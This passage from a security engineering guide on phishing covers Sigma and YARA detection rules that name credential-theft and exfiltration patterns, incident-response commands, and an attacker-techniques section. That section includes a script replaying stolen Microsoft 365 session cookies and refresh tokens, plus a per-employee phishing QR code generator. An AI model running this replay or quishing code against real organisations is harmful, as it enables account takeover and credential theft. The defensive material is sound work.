  - attack.persistence
  - attack.t1550.001
```

#### 8.1.3 MFA fatigue / push bombing

Detects rapid-fire MFA push requests to a single user within a short window, followed by an eventual approval — the hallmark of MFA fatigue attacks (Uber/Lapsus$ pattern).

```yaml
title: MFA Push Bombing Detected
id: a9e2c7d4-5b31-48f0-9c6a-1e8d4f3b7a25
status: experimental
description: >
  Fires when a single user receives more than 5 MFA push notifications
  within a 10-minute window, especially when followed by a successful
  authentication. Correlates Entra ID sign-in logs with MFA result codes.
references:
  - https://attack.mitre.org/techniques/T1621/
  - https://www.uber.com/newsroom/security-update/
author: Security Engineering
date: 2025-01-15
logsource:
  product: azure
  service: signinlogs
detection:
  selection_mfa_deny:
    resultType: 500121
    status.additionalDetails: 'MFA denied; user declined the authentication'
  selection_mfa_success:
    resultType: 0
    authenticationDetails.authenticationMethod: 'Push notification'
  timeframe: 10m
  condition: selection_mfa_deny | count(userPrincipalName) > 5 and selection_mfa_success
falsepositives:
  - Users with multiple devices receiving duplicate push notifications
  - Authentication loop caused by misconfigured client
level: critical
tags:
  - attack.credential_access
  - attack.t1621
```

#### 8.1.4 AiTM reverse-proxy phishing (Evilginx / Modlishka)

Detects sign-in events where the session token was issued from an IP address that does not match the user's subsequent activity IP, indicating a stolen session cookie replayed from an attacker-controlled host.

```yaml
title: AiTM Proxy - Session Token IP Mismatch
id: d5f1b839-7c42-4a9e-8e61-2b0d6f5c3e97
status: experimental
description: >
  Correlates the IP address at token issuance with the IP used in subsequent
  API calls within the same session. A mismatch where the issuance IP
  resolves to a known hosting/VPS provider (not a corporate egress) and the
  usage IP is the legitimate user's IP indicates session hijacking via AiTM
  proxy. Also detects sign-ins where the user-agent string or TLS fingerprint
  at authentication differs from subsequent Graph API calls.
references:
  - https://attack.mitre.org/techniques/T1557/
  - https://www.microsoft.com/en-us/security/blog/2022/07/12/from-cookie-theft-to-bec-attackers-use-aitm-phishing-sites-as-entry-point-to-further-financial-fraud/
author: Security Engineering
date: 2025-02-10
logsource:
  product: azure
  service: signinlogs
detection:
  selection_auth:
    resultType: 0
    authenticationDetails.succeeded: true
  selection_ip_mismatch:
    ipAddress|not_endswith:
      - '.corp.contoso.com'
    # Custom enrichment field from threat intel feed
    x-ip-hosting-provider: true
  selection_ua_mismatch:
    userAgent|differs_from_session_ua: true
  condition: selection_auth and (selection_ip_mismatch or selection_ua_mismatch)
falsepositives:
  - Users on mobile networks with rapidly changing IPs (CG-NAT)
  - Legitimate VPN switching during a session
level: high
tags:
  - attack.credential_access
  - attack.t1557
  - attack.t1539
```

#### 8.1.5 Mailbox forwarding rule abuse

Detects creation of email forwarding rules (inbox rules or transport rules) that forward mail to an external address — a common persistence mechanism after BEC compromise. Attackers create rules to exfiltrate ongoing correspondence or to intercept MFA codes sent via email.

```yaml
title: Suspicious Email Forwarding Rule Created
id: e8c4a261-3d17-4f9b-b582-7a1e9d0c4f36
status: experimental
description: >
  Detects creation of inbox rules in Exchange Online / on-premises Exchange
  that forward or redirect email to external domains. Covers both
  New-InboxRule (PowerShell / EAC) and client-side rule creation via
  Outlook or OWA. Also detects Set-Mailbox -ForwardingSmtpAddress
  and Set-Mailbox -ForwardingAddress changes.
references:
  - https://attack.mitre.org/techniques/T1114/003/
  - https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/detect-and-remediate-outlook-rules-forms-attack
author: Security Engineering
date: 2025-01-20
logsource:
  product: m365
  service: exchangeonline
detection:
  selection_inbox_rule:
    Operation|contains:
      - 'New-InboxRule'
      - 'Set-InboxRule'
      - 'Enable-InboxRule'
    Parameters.ForwardTo|contains: '@'
    Parameters.ForwardTo|not_endswith:
      - '@contoso.com'
      - '@contoso.onmicrosoft.com'
  selection_mailbox_forward:
    Operation|contains:
      - 'Set-Mailbox'
    Parameters|contains:
      - 'ForwardingSmtpAddress'
      - 'ForwardingAddress'
  selection_transport_rule:
    Operation: 'New-TransportRule'
    Parameters|contains: 'RedirectMessageTo'
  condition: selection_inbox_rule or selection_mailbox_forward or selection_transport_rule
falsepositives:
  - Legitimate delegation to external partners (should be pre-approved)
  - Automated ticketing systems with external forwarding
level: high
tags:
  - attack.collection
  - attack.t1114.003
  - attack.persistence
  - attack.t1137
```

#### 8.1.6 Browser-in-the-browser (BitB) attack indicators

Detects endpoint telemetry consistent with browser-in-the-browser phishing: a top-level page spawning a borderless popup window with URL-bar spoofing via CSS/HTML, typically used to display a fake OAuth/SSO login prompt that appears to be a legitimate browser window.

```yaml
title: Browser-in-the-Browser Phishing Indicators
id: f2b7d953-1a48-4e0c-9d35-8c6f1e4a2b09
status: experimental
description: >
  Detects endpoint proxy logs where a page loads resources consistent with
  BitB kits: CSS that hides browser chrome, JavaScript that creates
  draggable popup overlays, and embedded iframes pointing to credential
  capture endpoints. Also detects Sysmon Event ID 1 where a browser
  child-process title contains SSO provider names but the URL domain
  does not match the provider.
references:
  - https://mrd0x.com/browser-in-the-browser-phishing/
  - https://attack.mitre.org/techniques/T1566/002/
author: Security Engineering
date: 2025-02-15
logsource:
  category: proxy
  product: web
detection:
  selection_bitb_resources:
    cs-uri-path|contains:
      - '/window.css'
      - '/popup.js'
      - '/chrome-frame'
      - '/browser-frame'
    cs-referer|not_endswith:
      - 'login.microsoftonline.com'
      - 'accounts.google.com'
      - 'appleid.apple.com'
  selection_fake_popup:
    cs-uri-query|contains:
      - 'draggable=true'
      - 'frameless=true'
      - 'popup_mode=bitb'
  condition: selection_bitb_resources or selection_fake_popup
falsepositives:
  - Legitimate web applications using custom popup/modal patterns
  - Browser extension testing frameworks
level: medium
tags:
  - attack.initial_access
  - attack.t1566.002
```

### 8.2 YARA rules for phishing artifact detection

#### 8.2.1 Phishing kit detection (ZIP / directory structure)

```
rule PhishingKit_Common_Structure
{
    meta:
        author      = "Security Engineering"
        description = "Detects common phishing kit directory structure and PHP credential-logging patterns"
        date        = "2025-01-20"
        reference   = "https://attack.mitre.org/techniques/T1566/003/"

    strings:
        // Common phishing kit PHP patterns
        $log_creds1  = "fwrite($file, $email" ascii
        $log_creds2  = "file_put_contents('log" ascii
        $log_creds3  = "$_POST['password']" ascii
        $log_creds4  = "$_POST['pass']" ascii
        $log_creds5  = "mail($to, $subject" ascii

        // Telegram bot exfiltration (modern kits)
        $tg_exfil1   = "api.telegram.org/bot" ascii
        $tg_exfil2   = "sendMessage" ascii
        $tg_exfil3   = "chat_id" ascii

        // Anti-analysis / bot detection
        $antibot1    = "HTTP_X_FORWARDED_FOR" ascii
        $antibot2    = "block_bot" ascii
        $antibot3    = "crawl" ascii nocase
        $antibot4    = "googlebot" ascii nocase

        // Common phishing page indicators
        $brand_spoof1 = "Microsoft Corporation" ascii wide
        $brand_spoof2 = "Sign in to your account" ascii wide
        $brand_spoof3 = "Verify your identity" ascii wide

        // Redirect after credential capture
        $redirect1   = "header('Location:" ascii
        $redirect2   = "window.location.replace" ascii

    condition:
        filesize < 5MB and
        (
            (2 of ($log_creds*) and 1 of ($redirect*)) or
            (2 of ($tg_exfil*) and 1 of ($log_creds*)) or
            (1 of ($log_creds*) and 1 of ($antibot*) and 1 of ($brand_spoof*))
        )
}
```

#### 8.2.2 HTML smuggling payload

Detects HTML files that construct and trigger downloads client-side using JavaScript Blob/URL APIs — the technique used in Nobelium's campaigns (2021-2022) and QakBot HTML smuggling waves.

```
rule HTMLSmuggling_Payload
{
    meta:
        author      = "Security Engineering"
        description = "Detects HTML smuggling: Base64-encoded payload decoded and triggered as download via JS Blob/URL APIs"
        date        = "2025-01-20"
        reference   = "https://attack.mitre.org/techniques/T1027/006/"
        mitre       = "T1027.006, T1566.001"

    strings:
        // Base64 decoding in JS
        $b64_decode1 = "atob(" ascii
        $b64_decode2 = "Buffer.from(" ascii
        $b64_decode3 = "base64ToArrayBuffer" ascii
        $b64_decode4 = "Uint8Array" ascii

        // Blob construction and download trigger
        $blob1       = "new Blob(" ascii
        $blob2       = "URL.createObjectURL" ascii
        $blob3       = "msSaveOrOpenBlob" ascii
        $blob4       = "msSaveBlob" ascii

        // Download trigger
        $dl_trigger1 = "download=" ascii
        $dl_trigger2 = ".click()" ascii
        $dl_trigger3 = "createElement('a')" ascii wide
        $dl_trigger4 = "document.createElement" ascii

        // Large Base64 string (payload)
        $payload     = /[A-Za-z0-9+\/]{500,}={0,2}/ ascii

        // Anti-analysis
        $sandbox1    = "navigator.hardwareConcurrency" ascii
        $sandbox2    = "navigator.deviceMemory" ascii
        $sandbox3    = "screen.width" ascii

    condition:
        filesize < 10MB and
        (
            (1 of ($b64_decode*) and 1 of ($blob*) and 1 of ($dl_trigger*)) or
            (1 of ($b64_decode*) and 1 of ($blob*) and $payload) or
            (1 of ($b64_decode*) and 1 of ($blob*) and 1 of ($sandbox*))
        )
}
```

#### 8.2.3 Social Engineering Toolkit (SET) payload artifacts

Detects artifacts from SET (Social Engineering Toolkit) — configuration files, generated payloads, and credential-harvesting logs.

```
rule SET_Toolkit_Artifacts
{
    meta:
        author      = "Security Engineering"
        description = "Detects Social Engineering Toolkit configuration, payload, and harvester artifacts"
        date        = "2025-01-20"
        reference   = "https://github.com/trustedsec/social-engineer-toolkit"

    strings:
        // SET configuration markers
        $set_cfg1    = "METASPLOIT_PATH=" ascii
        $set_cfg2    = "ETTERCAP=ON" ascii
        $set_cfg3    = "WEBATTACK_EMAIL" ascii
        $set_cfg4    = "set_config" ascii
        $set_cfg5    = "HARVESTER" ascii

        // SET credential harvester output
        $harvest1    = "PARAM: " ascii
        $harvest2    = "POSSIBLE USERNAME" ascii
        $harvest3    = "POSSIBLE PASSWORD" ascii
        $harvest4    = "POST DATA" ascii

        // SET payload generation markers
        $payload1    = "social-engineer-toolkit" ascii
        $payload2    = "/root/.set/" ascii
        $payload3    = "setoolkit" ascii
        $payload4    = "set/src/core" ascii

        // SET-generated Java applet markers (legacy but still seen)
        $java1       = "SignedApplet" ascii
        $java2       = "SecurityManager" ascii

        // SET HTA payload markers
        $hta1        = "mshta.exe" ascii wide
        $hta2        = "<HTA:APPLICATION" ascii nocase

    condition:
        filesize < 50MB and
        (
            (3 of ($set_cfg*)) or
            (2 of ($harvest*)) or
            (2 of ($payload*) and 1 of ($set_cfg*)) or
            (1 of ($hta*) and 1 of ($payload*))
        )
}
```

### 8.3 Email gateway detection patterns

Beyond Sigma rules for SIEM correlation, email security gateways (Proofpoint, Mimecast, Microsoft Defender for Office 365, Cisco Secure Email) should implement the following transport-level detections.

**Header anomaly rules:**

| Rule | Logic | Severity |
|------|-------|----------|
| Envelope-from / header-from mismatch | `MAIL FROM` domain ≠ `From:` header domain and neither SPF nor DKIM align | High |
| Reply-to domain mismatch | `Reply-To:` domain differs from `From:` domain | Medium |
| Recently-registered sender domain | WHOIS `creationDate` < 30 days | High |
| Display name spoofing | `From:` display name matches an internal VIP but domain is external | Critical |
| Suspicious X-Mailer / User-Agent | Known phishing tool signatures (`Gophish`, `King Phisher`, `SET`) | Critical |
| Missing DKIM signature | No `DKIM-Signature:` header on inbound mail from domain with published DKIM keys | Medium |
| DMARC p=none on high-value domain | Sender domain publishes `p=none` — no enforcement | Low (monitor) |

**Content-based rules:**

| Rule | Logic | Severity |
|------|-------|----------|
| QR code in email body/attachment | Image contains QR code pointing to non-allowlisted domain | High |
| HTML attachment with JS Blob API | HTML attachment contains `Blob`, `createObjectURL`, `atob` | Critical |
| Password-protected archive | `.zip`/`.7z`/`.rar` with password in email body ("Password: 1234") | High |
| Brand impersonation keywords | Subject/body contains "verify your account", "suspended", "unauthorized" with external sender | Medium |
| Callback phishing pattern | Body contains phone number but no URLs or attachments | Medium |
| ISO/IMG attachment | Disk image attachment (bypass MOTW in older Windows) | Critical |

**URL rewriting and detonation.** Configure the gateway to rewrite all URLs in inbound email (Proofpoint URL Defense, Mimecast URL Protect, Microsoft Safe Links). Time-of-click analysis re-evaluates the URL when the user clicks, catching delayed weaponization (attacker changes landing page after email delivery). Sandbox detonation of attachments should include HTML files (for smuggling detection) and PDF files (for QR code extraction and embedded-link analysis).

---

## 9. Social engineering forensics and incident response

### 9.1 Email header forensics

When investigating a suspected phishing email, the full email headers (RFC 5322 + RFC 2045 MIME) provide the forensic trail from the attacker's sending infrastructure to the victim's inbox.

**Extracting full headers.** In Outlook: open the message → File → Properties → Internet Headers. In Gmail: open the message → three-dot menu → Show Original. In Microsoft 365 admin: Message Trace → download `.eml`. Programmatically via Microsoft Graph API:

```bash
# Extract full headers from an EML file
# Using Python's email module
python3 -c "
import email, sys
with open(sys.argv[1], 'rb') as f:
    msg = email.message_from_binary_file(f)
for header, value in msg.items():
    print(f'{header}: {value}')
" suspicious_email.eml

# Using msgconvert for MSG format (Outlook)
msgconvert suspicious.msg
# Produces suspicious.eml

# Microsoft Graph API - get message headers
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users/$USER_ID/messages/$MESSAGE_ID?\$select=internetMessageHeaders" \
  | jq '.internetMessageHeaders[] | "\(.name): \(.value)"'
```

**Key headers to analyze (bottom-to-top reading order):**

| Header | Forensic Value |
|--------|---------------|
| `Received:` (chain) | Each MTA adds a `Received:` header. Read bottom-to-top to trace the path. The bottom-most `Received:` header is closest to the originating server. Look for suspicious hostnames, IP addresses in hosting ranges, and time gaps |
| `Received-SPF:` | SPF verification result (`pass`, `fail`, `softfail`, `neutral`, `none`) at the receiving MTA |
| `Authentication-Results:` | Aggregated results: SPF, DKIM, DMARC, and optionally ARC (Authenticated Received Chain) |
| `DKIM-Signature:` | Domain that signed the message (`d=`), selector (`s=`), and which headers/body are covered (`h=`, `bh=`). Verify with `opendkim-testmsg` |
| `X-Originating-IP:` | The IP of the client that submitted the message (set by some providers, notably Outlook.com) |
| `X-Mailer:` / `User-Agent:` | Sending client identifier. Phishing tools often leave fingerprints: GoPhish uses `gomail` |
| `Message-ID:` | Format reveals sending infrastructure. GoPhish: `<random@gophish>`. Legitimate M365: `<guid@domain.prod.outlook.com>` |
| `Return-Path:` | Envelope sender (MAIL FROM). Compare with `From:` header for mismatch detection |
| `List-Unsubscribe:` | Phishing emails often lack this or use malformed values |

**Automated header analysis tools:**

```bash
# MHA (Message Header Analyzer) - Microsoft's online tool
# https://mha.azurewebsites.net/

# emailheaders - CLI tool
pip install emailheaders
emailheaders -f suspicious.eml

# Manual SPF verification
dig TXT _spf.sender-domain.com +short

# Manual DKIM verification
opendkim-testmsg < suspicious.eml
# Or verify the DKIM signature against the published key
dig TXT selector._domainkey.sender-domain.com +short

# DMARC record lookup
dig TXT _dmarc.sender-domain.com +short

# Check if sending IP is in SPF allowed range
# Extract IP from bottom Received: header, then:
spfquery -ip 203.0.113.50 -sender user@sender-domain.com -helo mail.sender-domain.com
```

**Timestamp analysis.** Compare `Date:` header (set by the sender's MUA) with `Received:` timestamps (set by each MTA). A `Date:` header significantly before the first `Received:` suggests the email was queued or the sender's clock was manipulated. Convert all timestamps to UTC (RFC 5322 requires timezone offset) for consistent timeline analysis. Use `date -d "Thu, 15 Jan 2025 08:23:17 -0500" -u` to normalize.

### 9.2 Phishing takedown procedures

Once a phishing page or campaign is confirmed, the takedown process must be fast — median time-to-credential-theft after email delivery is under 60 minutes for targeted campaigns.

**Immediate actions (first 30 minutes):**

1. **Block the URL/domain** in the email gateway (transport rule or URL block list), web proxy, and DNS sinkhole.
2. **Identify all recipients** who received the phishing email. In Exchange Online:

```powershell
# Search for all instances of the phishing email by subject and sender
Search-Mailbox -Identity "All Users" -SearchQuery 'from:"attacker@evil.com" AND subject:"Urgent: Verify"' -TargetMailbox "IncidentResponse" -TargetFolder "PhishPurge" -LogOnly

# Purge the email from all mailboxes (hard delete)
# Microsoft 365 Compliance Center - Content Search + Purge
New-ComplianceSearch -Name "PhishPurge_20250115" `
  -ExchangeLocation All `
  -ContentMatchQuery '(from:attacker@evil.com) AND (subject:"Urgent: Verify")'
Start-ComplianceSearch -Identity "PhishPurge_20250115"

# After search completes:
New-ComplianceSearchAction -SearchName "PhishPurge_20250115" -Purge -PurgeType HardDelete
```

3. **Notify users** who clicked the link (from proxy/Safe Links logs) that the link was malicious and to report any credentials they entered.

**Takedown request submission:**

- **Domain registrar abuse:** Identify the registrar via `whois` and submit abuse report. Most registrars have an `abuse@registrar.com` contact. Include the phishing URL, screenshot, email headers, and a statement that the domain is being used for phishing. Reference the registrar's acceptable-use policy.
- **Hosting provider abuse:** Identify the hosting IP via `dig A evil-domain.com` and submit abuse to the hosting provider. Include the same evidence package.
- **Google Safe Browsing:** Submit at `https://safebrowsing.google.com/safebrowsing/report_phish/`. This propagates to Chrome, Firefox, and Safari browser warnings.
- **APWG (Anti-Phishing Working Group):** Submit to `reportphishing@apwg.org`. APWG distributes reports to member ISPs, registrars, and law enforcement.
- **Brand-specific takedown:** Major targets (Microsoft, Google, PayPal) have dedicated phishing-report channels. Microsoft: `phish@office365.microsoft.com`. Google: `phishing-report@google.com`.
- **Certificate Authority:** If the phishing site uses an SSL certificate, report to the CA for revocation. Check the certificate issuer via `openssl s_client -connect evil-domain.com:443 2>/dev/null | openssl x509 -noout -issuer`.
- **Netcraft / PhishTank:** Submit the URL for community blocklisting and automated takedown.

**Tracking takedown effectiveness:**

```bash
# Monitor if the phishing domain is still resolving
watch -n 300 'dig +short A evil-domain.com && echo "STILL LIVE" || echo "TAKEN DOWN"'

# Check Google Safe Browsing status
curl -s "https://transparencyreport.google.com/safe-browsing/search?url=evil-domain.com"

# Monitor certificate revocation
openssl s_client -connect evil-domain.com:443 2>/dev/null | openssl x509 -noout -text | grep -A2 "CRL\|OCSP"
```

### 9.3 Credential compromise triage

When a user submits credentials to a phishing page, the response must assume full compromise of the account and all systems accessible with those credentials.

**Triage playbook (time-critical, execute within 1 hour):**

1. **Reset password immediately.** Force password change via the IdP (Entra ID, Okta, Ping). Do not wait for the user to self-service.

```powershell
# Entra ID / Azure AD - force password reset and revoke sessions
Set-AzureADUserPassword -ObjectId $userId -Password $secureNewPassword -ForceChangePasswordNextLogin $true
Revoke-AzureADUserAllRefreshToken -ObjectId $userId
```

```bash
# Okta - expire password and clear sessions
curl -X POST "https://$OKTA_DOMAIN/api/v1/users/$USER_ID/lifecycle/expire_password" \
  -H "Authorization: SSWS $API_TOKEN"

curl -X DELETE "https://$OKTA_DOMAIN/api/v1/users/$USER_ID/sessions" \
  -H "Authorization: SSWS $API_TOKEN"
```

2. **Revoke all active sessions and tokens.** The attacker may have already exchanged credentials for a session token (especially in AiTM attacks where the session cookie is captured directly).

3. **Review sign-in logs.** Check for successful authentications from suspicious IPs/locations after the credential submission timestamp.

```bash
# Microsoft Graph - query sign-in logs for the compromised user
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/auditLogs/signIns?\$filter=userPrincipalName eq 'victim@contoso.com' and createdDateTime ge 2025-01-15T00:00:00Z&\$orderby=createdDateTime desc" \
  | jq '.value[] | {createdDateTime, ipAddress, location, appDisplayName, status}'
```

4. **Check for persistence mechanisms.** The attacker may have established persistence within the 60-minute window:
   - Inbox forwarding rules (see §8.1.5)
   - OAuth application consent grants
   - MFA method additions (attacker registers their own authenticator)
   - Delegated access or mailbox permissions changes
   - Service principal / app registration creation

```powershell
# Check inbox rules
Get-InboxRule -Mailbox victim@contoso.com | Where-Object {
    $_.ForwardTo -or $_.ForwardAsAttachmentTo -or $_.RedirectTo
} | Format-List Name, ForwardTo, RedirectTo, Description

# Check OAuth app consents for the user
Get-AzureADUserOAuth2PermissionGrant -ObjectId $userId | Format-List

# Check MFA methods registered
Get-MgUserAuthenticationMethod -UserId victim@contoso.com | Format-List
```

5. **Assess blast radius.** Determine what the compromised account has access to: shared mailboxes, SharePoint sites, Teams channels, Azure resources, VPN, internal applications. Assume the attacker accessed all of them.

6. **Preserve evidence.** Export sign-in logs, audit logs, mailbox rule changes, and any identified attacker actions to a forensic evidence store with UTC ISO 8601 timestamps and hash verification.

### 9.4 Business Email Compromise (BEC) investigation

BEC investigations differ from standard phishing because the attacker typically maintains persistent access to a mailbox for days or weeks, silently monitoring conversations before striking.

**Investigation timeline construction:**

1. **Identify the initial compromise vector.** Was it credential phishing, consent phishing, password spray, or AiTM? Check sign-in logs for the earliest suspicious authentication.

2. **Determine the dwell time.** Check the Unified Audit Log (UAL) for the full period of attacker activity:

```powershell
# Search UAL for all activity by the compromised account from suspicious IPs
Search-UnifiedAuditLog -StartDate "2025-01-01" -EndDate "2025-01-20" `
  -UserIds victim@contoso.com `
  -Operations MailItemsAccessed, Send, MoveToDeletedItems, New-InboxRule, Set-InboxRule, UpdateInboxRules `
  -ResultSize 5000 | Export-Csv -Path "BEC_audit_log.csv" -NoTypeInformation
```

3. **Map attacker actions.** Common BEC attacker playbook:
   - Day 1: Initial access, create inbox rules to hide replies from the real account owner (rule: "if subject contains 'invoice' or 'payment', move to RSS Feeds/Deleted Items")
   - Days 2-5: Read email silently, identify ongoing financial transactions, learn communication patterns
   - Day 5-10: Insert themselves into a conversation thread (reply with modified payment instructions, using the compromised account or a lookalike account created for this purpose)
   - Day 10+: Execute the fraud (vendor impersonation wire transfer, payroll diversion, gift card scheme)

4. **Financial impact assessment.** If a wire transfer was initiated:
   - Contact the bank immediately (within 72 hours for best chance of recovery via the IC3 Recovery Asset Team / FBI RAT program)
   - File an IC3 complaint (ic3.gov) — BEC losses > $250,000 trigger RAT intervention
   - Preserve all financial transaction records and correspondence

5. **Indicators of Compromise (IoC) extraction.** Document: attacker IP addresses, user-agent strings, inbox rule configurations, any lookalike domains used, OAuth applications consented, and the timeline of all actions.

### 9.5 Vishing forensics

Voice-based social engineering attacks are harder to forensically reconstruct because audio is ephemeral and caller-ID is trivially spoofed. However, several evidence sources exist.

**Evidence collection:**

- **Call Detail Records (CDR).** Request from the PBX/SIP provider: calling number, called number, timestamp, duration, SIP trunk used. STIR/SHAKEN attestation level (A = full, B = partial, C = gateway — C attestation is often spoofed).
- **SIP headers.** If the organization's SIP infrastructure logs full SIP headers, the `Via:`, `Contact:`, and `P-Asserted-Identity:` headers reveal the actual originating SIP endpoint (which may differ from the spoofed caller ID in the `From:` header).
- **Call recordings.** If call recording is enabled (legal requirements vary by jurisdiction — check two-party consent laws), the recording is primary evidence. Analyze for: voice deepfake indicators (unnatural prosody, background noise inconsistencies, latency patterns suggesting real-time synthesis), specific social engineering techniques used (urgency, authority, technical jargon), information requested or obtained.
- **Recipient interview.** Structured debrief within 24 hours while memory is fresh: exact words used by the caller, caller's claimed identity and organization, information provided to the caller, actions taken during or after the call, any reference numbers or callback numbers provided.
- **VoIP provider logs.** Subpoena or provider cooperation for the originating trunk — particularly useful when the attack originates from a legitimate VoIP provider (Twilio, Vonage) that logs API calls with account information.

**Voice deepfake detection.** AI-generated voice (used in CEO-fraud vishing) can be analyzed with spectral analysis tools. Indicators: uniform pitch variance (too consistent), missing or synthetic breath patterns, spectral artifacts from vocoder-based synthesis (especially at frequency boundaries around 4 kHz and 8 kHz), and latency patterns if the deepfake is being generated in real-time (slight delays in response to unexpected questions). Tools: Resemblyzer (speaker embedding comparison), ASVspoof challenge models for spoofed speech detection.

---

## 10. Advanced phishing techniques

### 10.1 AiTM (Adversary-in-the-Middle) phishing — deep dive

Section 5.2 covered Evilginx2 setup and phishlet configuration. This section covers the post-capture attack chain, evasion techniques, and the evolution from Evilginx2 to Evilginx3.

**Token replay mechanics.** When the victim authenticates through the AiTM proxy, Evilginx captures the session cookies — specifically, for Microsoft 365: `ESTSAUTH`, `ESTSAUTHPERSISTENT`, and the OAuth access/refresh tokens. The attacker imports these cookies into their browser (Cookie-Editor extension, or programmatically via Selenium/Playwright):

```python
# Replay stolen session cookies using requests
import requests

session = requests.Session()

# Cookies captured by Evilginx
cookies = {
    'ESTSAUTH': '<captured_value>',
    'ESTSAUTHPERSISTENT': '<captured_value>',
    'stsservicecookie': '<captured_value>'
}

# Access the victim's mailbox via Outlook Web
resp = session.get(
    'https://outlook.office365.com/owa/',
    cookies=cookies,
    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
)

# Or use the refresh token to generate new access tokens
token_resp = session.post(
    'https://login.microsoftonline.com/common/oauth2/v2.0/token',
    data={
        'grant_type': 'refresh_token',
        'refresh_token': '<captured_refresh_token>',
        'client_id': '1fec8e78-bce4-4aaf-ab1b-5451cc387264',  # Outlook client ID
        'scope': 'https://graph.microsoft.com/.default'
    }
)
access_token = token_resp.json()['access_token']
```

**Evilginx3 evolution.** Evilginx3 (released 2023) introduced: integrated phishing page serving (no separate web server needed), improved JavaScript injection for credential capture, better TLS handling, and support for Cloudflare-protected targets via custom TLS fingerprinting. The phishlet format changed from YAML to a more structured configuration supporting multi-step authentication flows (e.g., username on page 1, password on page 2, MFA on page 3).

**AiTM evasion techniques used by threat actors:**

- **Domain fronting / CDN abuse.** Host the AiTM proxy behind a CDN (Cloudflare, AWS CloudFront) so the phishing domain resolves to a legitimate CDN IP range, bypassing IP-reputation-based blocking.
- **Just-in-time activation.** The phishing page shows a benign landing page by default and only activates the AiTM proxy when a specific URL parameter (the lure token) is present — email gateway sandboxes that visit the URL without the parameter see a benign page.
- **User-agent filtering.** Block known security scanner user-agents and serve benign content to automated analysis while serving the phishing page to real browsers.
- **Geofencing.** Only serve the phishing page to IPs in the target's geographic region; return 404 or a benign page to all other IPs.
- **Turnstile / CAPTCHA integration.** Place a Cloudflare Turnstile or hCaptcha before the AiTM proxy to block automated scanners.

**Continuous Access Evaluation (CAE) as a detection/mitigation layer.** Microsoft's CAE evaluates access policies in near-real-time rather than waiting for token expiry (default 1-hour access token lifetime). With CAE enabled, critical events trigger immediate token revocation: user account disabled, password changed, MFA re-registration required, high-risk sign-in detected (Entra ID Protection). When an AiTM attacker replays a stolen token from a different IP, CAE can detect the IP change and revoke the session within minutes rather than waiting up to 1 hour.

### 10.2 Quishing (QR code phishing) at scale

While §1.2 introduced QR code phishing, this section covers the operational TTPs used in large-scale quishing campaigns observed from 2023 onward.

**QR code generation for phishing at scale:**

```python
# Generate unique QR codes per target (tracking + credential capture)
import qrcode
import hashlib
import csv

base_url = "https://auth-verify.example-evil.com/sso"

with open('targets.csv', 'r') as f:
    reader = csv.DictReader(f)
    for row in reader:
        # Unique tracking token per target
        token = hashlib.sha256(
            f"{row['email']}:{row['employee_id']}".encode()
        ).hexdigest()[:16]

        target_url = f"{base_url}?ref={token}"

        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=4,
        )
        qr.add_data(target_url)
        qr.make(fit=True)

        img = qr.make_image(fill_color="black", back_color="white")
        img.save(f"qr_{row['employee_id']}.png")
```

**Evasion techniques in quishing campaigns:**

- **QR code in PDF attachment.** The email contains a PDF attachment with an embedded QR code. Most email gateway sandboxes scan for URLs in text/HTML but do not perform OCR or QR code decoding on images embedded in PDFs.
- **QR code in image attachment.** Same principle — the URL is encoded in an image, not in parseable text.
- **Multi-step redirect.** The QR code points to a legitimate URL shortener (which is allowlisted by most gateways), which redirects to the phishing page.
- **QR code in voicemail notification.** The phishing email claims to be a voicemail notification with a QR code to "listen to your message" — exploits the fact that mobile users scan QR codes on their personal devices, which lack corporate security controls.
- **Physical QR codes.** Stickers placed on office equipment, parking meters, or posted on bulletin boards. These bypass all email-based detection because the QR code never transits the email gateway.

**Detection for quishing.** Email gateways must implement QR code decoding on image attachments and inline images. Microsoft Defender for Office 365 added QR code detection in late 2023. For gateways that lack native QR code scanning, deploy a custom transport rule that quarantines emails with image attachments and no text-based URLs (the quishing signature: an email with an image containing a QR code and no clickable link in the body).

### 10.3 Deepfake social engineering

AI-generated audio and video are increasingly used in social engineering attacks, particularly CEO-fraud vishing and BEC.

**Known incidents:**

- **UK energy firm (2019).** Attackers used AI-generated voice cloning to impersonate the CEO of the firm's German parent company, convincing the UK CEO to wire $243,000 to a Hungarian bank account. The voice was described as matching the German accent, tone, and speech patterns of the real CEO. This was one of the first documented cases of deepfake-enabled vishing.
- **Hong Kong deepfake video conference (2024).** Attackers created deepfake video representations of multiple company executives in a video conference call, convincing a finance employee to transfer $25 million. The employee was the only real person on the call; all other participants were AI-generated.
- **Scattered Spider audio deepfakes (2023-2024).** The UNC3944/Scattered Spider group reportedly used AI voice cloning to enhance their help-desk social engineering calls, making their impersonation of employees more convincing when calling IT help desks to request MFA resets.

**Deepfake generation TTPs (for awareness — understand the attacker's capability):**

- Voice cloning requires as little as 3 seconds of reference audio with modern models (e.g., OpenAI's voice engine, ElevenLabs, VALL-E research). Publicly available audio from conference talks, podcasts, YouTube videos, or social media provides training data.
- Real-time voice conversion (RVC) allows an attacker to speak naturally and have their voice converted to the target's voice in real-time with <200ms latency, enabling interactive phone conversations.
- Video deepfakes for live video calls use face-swapping models that run in real-time on consumer GPUs. Quality degrades with head rotation and occlusion, but is sufficient for typical webcam-resolution video calls.

**Organizational countermeasures:**

- **Out-of-band verification for financial transactions.** Any wire transfer or payment change request must be verified via a separate, pre-established communication channel (a known phone number called by the finance team — never a number provided in the request).
- **Code word / challenge-response.** Pre-established code words for high-value requests that cannot be obtained from public information.
- **Multi-party approval.** Financial transactions above a threshold require approval from multiple individuals, reducing the attack surface for single-target social engineering.
- **Deepfake awareness training.** Train employees to recognize deepfake indicators: unnatural lip sync, inconsistent lighting/shadows, audio artifacts, and unusual latency in real-time conversations.

### 10.4 Supply chain phishing

Supply chain phishing targets the trust relationships between organizations and their vendors, partners, or service providers.

**Vendor email compromise (VEC).** The attacker compromises a vendor's email account (via any SE technique) and uses it to send phishing emails or fraudulent invoices to the vendor's customers. Because the email comes from a legitimate, trusted sender, it bypasses most detection. The 2020 SolarWinds supply chain attack (Nobelium / APT29) used compromised SolarWinds email accounts to send phishing emails to downstream customers.

